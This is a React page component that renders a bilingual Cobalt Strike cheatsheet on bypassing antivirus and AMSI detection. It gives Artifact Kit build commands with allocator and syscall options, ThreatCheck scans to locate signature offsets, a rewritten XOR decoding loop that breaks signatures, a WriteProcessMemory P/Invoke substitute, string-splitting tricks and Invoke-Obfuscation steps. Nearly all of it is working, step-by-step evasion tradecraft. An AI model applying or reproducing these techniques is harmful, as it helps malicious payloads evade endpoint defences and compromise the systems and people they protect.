"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function PayloadBypassPage() {
  const { lang } = useLanguage();

  const buildArtifact = `./build.sh mailslot VirtualAlloc 344564 0 false false none /output/artifacts`;

  const whileLoop =
`// patch.c - remplacer la boucle de décodage
// for (int x = 0; x < length; x++) { ... }

int x = length;
while ( x-- ) {
    *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}`;

  const wpmBypass =
`$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)`;

  const sections = [
    {
      id: "compiled",
      title: lang === "fr" ? "Payloads compilés" : "Compiled payloads",
      entries: [
        {
          cmd: "./build.sh",
          why: lang === "fr"
            ? "Sans args : affiche les stage sizes minimales pour la version CS actuelle. Vérifier avant chaque build."
            : "No args: prints minimum stage sizes for current CS version. Check before every build.",
        },
        {
          cmd: buildArtifact,
          why: lang === "fr"
            ? "Params : technique, allocator (HeapAlloc/VirtualAlloc/MapViewOfFile), stage_size, rdll_size, resource_file, stack_spoof, syscalls (none/embedded/indirect/indirect_randomized), output_dir."
            : "Params: technique, allocator (HeapAlloc/VirtualAlloc/MapViewOfFile), stage_size, rdll_size, resource_file, stack_spoof, syscalls (none/embedded/indirect/indirect_randomized), output_dir.",
        },
        {
          cmd: "ThreatCheck.exe -f artifact64big.exe",
          why: lang === "fr"
            ? "Divise le binaire et scanne chaque bloc avec Defender (cloud off). Retourne l'offset du premier bloc détecté. Scanner en local uniquement."
            : "Splits the binary and scans each chunk with Defender (cloud off). Returns offset of first detected chunk. Scan locally only.",
        },
        {
          cmd: "Navigation > Go To > file(0x<offset>)",
          why: lang === "fr"
            ? "Dans Ghidra : atteindre directement la fonction suspecte via l'offset ThreatCheck. Matcher les bytes de fin pour identifier la ligne source."
            : "In Ghidra: jump directly to the suspicious function via the ThreatCheck offset. Match trailing bytes to identify the source line.",
        },
        {
          cmd: whileLoop,
          why: lang === "fr"
            ? "Réécrire la boucle de décodage en boucle while à rebours : même logique, bytecode différent, signature cassée. Commenter l'original pour permettre un rollback."
            : "Rewrite the decoding loop as a backwards while: same logic, different bytecode, signature broken. Comment out the original to allow rollback.",
        },
        {
          cmd: "Cobalt Strike > Script Manager > Load > artifact.cna",
          why: lang === "fr"
            ? "Charger l'Aggressor script pour activer les nouveaux templates. Rescanner après chaque rebuild pour confirmer."
            : "Load the Aggressor script to enable the new templates. Re-scan after each rebuild to confirm.",
        },
      ],
    },
    {
      id: "script",
      title: lang === "fr" ? "Payloads script (AMSI)" : "Script payloads (AMSI)",
      entries: [
        {
          cmd: "./build.sh /output/custom-resources",
          why: lang === "fr"
            ? "Génère les templates script (template.x64.ps1, compress.ps1...) et resources.cna."
            : "Generates script templates (template.x64.ps1, compress.ps1...) and resources.cna.",
        },
        {
          cmd: "ThreatCheck.exe -f template.x64.ps1 -e AMSI -t Script",
          why: lang === "fr"
            ? "Scanner avec le moteur AMSI. Rescanner après chaque correction car plusieurs signatures peuvent coexister."
            : "Scan with the AMSI engine. Re-scan after each fix as multiple signatures may coexist.",
        },
        {
          cmd: `('System.dll')  →  ('Syst'+'em.dll')`,
          why: lang === "fr"
            ? "La concaténation casse les signatures sur les chaînes littérales sans changer la fonctionnalité."
            : "Concatenation breaks literal-string signatures without altering functionality.",
        },
        {
          cmd: wpmBypass,
          why: lang === "fr"
            ? "Remplacer Marshal::Copy par WriteProcessMemory natif via P/Invoke pour bypasser les signatures sur les appels Marshal."
            : "Replace Marshal::Copy with native WriteProcessMemory via P/Invoke to bypass Marshal-based signatures.",
        },
        {
          cmd: "ipmo Invoke-Obfuscation.psd1 && Invoke-Obfuscation\nSET SCRIPTBLOCK '<contenu compress.ps1>'\nTOKEN\\ALL\\1",
          why: lang === "fr"
            ? "PowerShell soumet les couches d'évaluation séquentiellement à AMSI - ThreatCheck ne réplique pas ça. Obfusquer compress.ps1 avec Invoke-Obfuscation. Ne pas modifier %%DATA%%."
            : "PowerShell submits evaluation layers to AMSI sequentially - ThreatCheck cannot replicate this. Obfuscate compress.ps1 with Invoke-Obfuscation. Do not modify %%DATA%%.",
        },
        {
          cmd: "Cobalt Strike > Script Manager > Load > resources.cna",
          why: lang === "fr"
            ? "Requis pour que CS utilise les templates script personnalisés."
            : "Required for CS to use the custom script templates.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Cobalt Strike</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Payload Bypass</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Bypasser les détections AV/AMSI sur les payloads compilés et scripts. Cycle : scan → localiser → patcher → rebuild."
            : "Bypass AV/AMSI detections on compiled payloads and scripts. Cycle: scan → locate → patch → rebuild."}
        </p>
      </header>

      {sections.map((section) => (
        <section key={section.id} id={section.id} className="mb-10">
          <h2 className="mb-4 font-mono text-xs uppercase tracking-widest text-primary">
            {section.title}
          </h2>
          <div className="space-y-4">
            {section.entries.map((entry, i) => (
              <CheatsheetCommandCard key={i} cmd={entry.cmd} why={entry.why} lang={lang} />
            ))}
          </div>
        </section>
      ))}
    </div>
  );
}
